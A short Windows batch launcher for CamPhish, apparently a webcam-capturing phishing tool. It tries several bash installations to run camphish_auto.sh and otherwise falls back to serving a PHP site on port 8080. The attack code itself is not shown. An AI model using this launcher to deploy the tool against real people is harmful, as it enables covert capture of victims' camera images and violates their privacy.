@echo off
echo [*] CamPhish Fallback Launcher
echo [*] Trying to run CamPhish with available bash...

cd /d "%~dp0"

REM Try Git Bash first
if exist "C:\Program Files\Git\bin\bash.exe" (
    echo [*] Using Git Bash...
    "C:\Program Files\Git\bin\bash.exe" -c "bash camphish_auto.sh"
    goto end
)

REM Try Git Bash in Program Files (x86)
if exist "C:\Program Files (x86)\Git\bin\bash.exe" (
    echo [*] Using Git Bash (x86)...
    "C:\Program Files (x86)\Git\bin\bash.exe" -c "bash camphish_auto.sh"
    goto end
)

REM Try WSL bash
if exist "C:\Windows\System32\bash.exe" (
    echo [*] Using WSL Bash...
    C:\Windows\System32\bash.exe -c "cd /mnt/c/Users/Irga/git\ irga/CamN/CamPhish && bash camphish_auto.sh"
    goto end
)

REM Try MSYS2
if exist "C:\msys64\usr\bin\bash.exe" (
    echo [*] Using MSYS2 Bash...
    "C:\msys64\usr\bin\bash.exe" -c "bash camphish_auto.sh"
    goto end
)

REM Try direct bash in PATH
bash --version >nul 2>&1
if %errorlevel% equ 0 (
    echo [*] Using system Bash...
    bash -c "bash camphish_auto.sh"
    goto end
)

echo [!] ERROR: No compatible bash found!
echo [!] Please install Git Bash or WSL
echo [!] Falling back to PHP server only...

REM Fallback to PHP server only
php -S 0.0.0.0:8080

:end
pause